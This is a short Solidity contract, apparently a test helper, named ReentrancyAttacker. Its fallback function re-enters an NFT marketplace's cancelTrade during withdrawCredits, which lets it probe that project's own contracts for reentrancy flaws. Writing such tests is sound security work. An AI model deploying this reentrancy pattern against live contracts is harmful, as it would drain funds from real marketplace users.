// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../HoloNFTStore-contracts/HoloNFT.sol";
import "../HoloNFTStore-contracts/MorpheusMarket.sol";

contract ReentrancyAttacker {
    HoloNFT public holoNFT;
    MorpheusMarket public market;
    bool private isSecondRun;

    constructor(address holoNFTAddress, address morpheusMarketAddress) {
        holoNFT = HoloNFT(holoNFTAddress);
        market = MorpheusMarket(morpheusMarketAddress);
        isSecondRun = false;
    }

    fallback() external payable {
        if (!isSecondRun) {
            // cancel trade
            uint256 numberOfTokens = holoNFT.balanceOf(address(this));

            for (uint256 i = 0; i < numberOfTokens; i++) {
                uint256 tokenId = holoNFT.tokenOfOwnerByIndex(address(this), i);
                market.cancelTrade(tokenId);
            }
        }

        // TODO: remove market as operator
    }

    function approve(address to, uint256 tokenId) public {
        holoNFT.approve(to, tokenId);
    }

    function openTrade(uint256 tokenId, uint248 newPrice) public {
        market.openTrade(tokenId, newPrice);
    }

    function claimCredit() public {
        isSecondRun = true;
        market.withdrawCredits();
    }
}
